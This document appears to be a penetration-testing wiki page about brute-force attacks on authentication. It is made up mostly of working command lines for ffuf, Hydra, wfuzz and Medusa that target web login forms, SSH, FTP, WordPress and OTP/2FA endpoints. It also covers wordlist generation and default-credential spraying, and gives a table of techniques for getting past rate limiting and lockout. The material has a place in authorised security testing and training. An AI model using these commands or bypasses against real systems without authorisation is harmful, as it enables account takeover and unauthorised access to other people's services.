# Brute Force

## Attack Types

| Type | Description | Use Case |
|---|---|---|
| Simple Brute Force | Tries every possible character combination | No prior info about the password |
| Dictionary Attack | Uses a pre-compiled wordlist | Likely weak or common passwords |
| Hybrid Attack | Dictionary words + numbers/symbols appended | Modified common passwords |
| Credential Stuffing | Leaked credentials tried on other services | Password reuse across services |
| Password Spraying | Few common passwords across many accounts | Account lockout policies in place |
| Reverse Brute Force | Known password tested against many usernames | Suspected password reuse |

---

## Web Brute Force with ffuf

```bash
# POST login form
ffuf -u https://TARGET/login -X POST \
  -d "username=FUZZ&password=FUZZ2" \
  -w users.txt:FUZZ -w passwords.txt:FUZZ2 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 401 -mc all

# With CSRF token (extract from response)
ffuf -u https://TARGET/login -X POST \
  -d "username=FUZZ&password=admin&csrf=TOKEN" \
  -w users.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=COOKIE" \
  -fc 403

# Basic auth
ffuf -u https://TARGET/admin -w passwords.txt \
  -H "Authorization: Basic FUZZ" \
  -fc 401

# Filter by response size (exclude failed login page size)
ffuf -u https://TARGET/login -X POST \
  -d "user=admin&pass=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -fs 4242
```

## Web Brute Force with Hydra

```bash
# General format
hydra -L users.txt -P passwords.txt TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# WordPress
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=dashboard"

# Basic Auth
hydra -L users.txt -P passwords.txt TARGET http-get /admin

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt TARGET ssh
hydra -s 2222 -l root -P passwords.txt TARGET ssh -t 4

# FTP
hydra -l admin -P passwords.txt ftp://TARGET

# With specific success indicator (S=)
hydra -l admin -P passwords.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome" -V
```

## Web Brute Force with wfuzz

```bash
# POST form login
wfuzz -c -z file,users.txt -z file,passwords.txt \
  -d "username=FUZZ&password=FUZ2Z" \
  --hc 403 https://TARGET/login

# Cookie-based session with brute force
wfuzz -c -z file,passwords.txt \
  -b "session=abc123" \
  -d "password=FUZZ" \
  --hh 1234 https://TARGET/verify
```

## Burp Intruder

Use Cluster Bomb attack type for username:password combinations. Use Pitchfork for paired credential lists. See [burp-suite.md](burp-suite.md) for detailed intruder configuration.

---

## Wordlists

### SecLists (Essential)

| Wordlist | Path | Use Case |
|---|---|---|
| rockyou.txt | `Passwords/Leaked-Databases/rockyou.txt` | General password brute force |
| top 10000 passwords | `Passwords/Common-Credentials/10-million-password-list-top-10000.txt` | Quick password spray |
| top usernames | `Usernames/top-usernames-shortlist.txt` | Username enumeration |
| default credentials | `Passwords/Default-Credentials/default-passwords.csv` | Default creds testing |
| 2FA bypass | `Fuzzing/4-digits-0000-9999.txt` | OTP brute force |
| common web passwords | `Passwords/Common-Credentials/best1050.txt` | Fast password spray |

- [SecLists](https://github.com/danielmiessler/SecLists)
- [Assetnote Wordlists](https://wordlists.assetnote.io/)
- [Kaonashi](https://github.com/kaonashi-passwords/Kaonashi)
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [WeakPass](https://weakpass.com/wordlist/)
- [Bug Bounty Wordlists](https://github.com/Karanxa/Bug-Bounty-Wordlists)

### Custom Wordlist Generation

```bash
# CeWL - scrape words from target website
cewl https://TARGET -m 5 -w custom_words.txt

# CUPP - profile-based password generation
cupp -i

# Username Anarchy - generate username variants
username-anarchy "John Smith"
username-anarchy -i names.txt -@ target.com

# Crunch - pattern-based generation
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 6 8 -t ,@@^^%%    # , = upper, @ = lower, ^ = special, % = number

# Combine wordlists and deduplicate
sort -u list1.txt list2.txt > combined.txt
```

### Password Policy Filtering

```bash
# Minimum 8 characters
grep -E '^.{8,}$' wordlist.txt

# At least one uppercase + one digit + min 8 chars
grep -E '^.{8,}$' wordlist.txt | grep '[A-Z]' | grep '[0-9]'

# At least one special character
grep -E '[!@#$%^&*()]' wordlist.txt

# Remove passwords containing "password"
grep -vi 'password' wordlist.txt
```

---

## Default Credentials

```bash
# changeme - test for default creds
# https://github.com/ztgrace/changeme
./changeme.py TARGET

# brutespray - spray default creds from nmap results
# https://github.com/x90skysn3k/brutespray
brutespray --file nmap_output.xml

# Hash identification
# https://github.com/noraj/haiti
haiti HASH_VALUE
```

### Default Credential Resources

| Resource | URL |
|---|---|
| DefaultCreds Cheat Sheet | [github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) |
| CIRT.net | [cirt.net/passwords](https://cirt.net/passwords) |
| pass-station | [github.com/noraj/pass-station](https://github.com/noraj/pass-station/) |
| NordPass Top Passwords | [nordpass.com/most-common-passwords-list](https://nordpass.com/most-common-passwords-list/) |
| Pwdb-Public | [github.com/ignis-sec/Pwdb-Public](https://github.com/ignis-sec/Pwdb-Public) |

---

## OTP / 2FA Brute Force

```bash
# 4-digit OTP
ffuf -u https://TARGET/verify-otp -X POST \
  -d "otp=FUZZ" \
  -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -H "Cookie: session=VALID_SESSION" \
  -fc 403 -mc all

# 6-digit OTP
crunch 6 6 0123456789 | ffuf -u https://TARGET/verify -X POST \
  -d "code=FUZZ" -w - -fc 403 -rate 10
```

See also: [2FA Bypass](../exploitation/authentication/2fa.md)

---

## Rate Limit Bypass Techniques

When brute force is blocked by rate limiting, try these bypass methods:

| Technique | Description |
|---|---|
| IP rotation | Use multiple IPs, proxies, or cloud functions |
| X-Forwarded-For header | `X-Forwarded-For: 127.0.0.1` (rotate IP values) |
| Case variation | `Admin`, `admin`, `ADMIN` may reset counters |
| Add null bytes | `admin%00`, `admin\x00` |
| Whitespace padding | `admin `, ` admin` |
| Request from IPv6 | Switch between IPv4 and IPv6 |
| API vs web | Try same creds via API endpoint if web is blocked |
| Distributed attacks | Slow down and spread across time |

See also: [Rate Limit Bypass](../exploitation/vulns/rate-limit-bypass.md)

---

## Medusa

```bash
# SSH brute force
medusa -h TARGET -u admin -P passwords.txt -M ssh

# FTP with parallel threads
medusa -h TARGET -U users.txt -P passwords.txt -M ftp -t 5

# Stop after first valid login
medusa -h TARGET -u admin -P passwords.txt -M ssh -f
```

---

## Related Pages

- [Password Attacks (Infra)](../../infra/exploitation/password-attacks.md)
- [2FA Bypass](../exploitation/authentication/2fa.md)
- [Rate Limit Bypass](../exploitation/vulns/rate-limit-bypass.md)
- [Burp Suite](burp-suite.md)
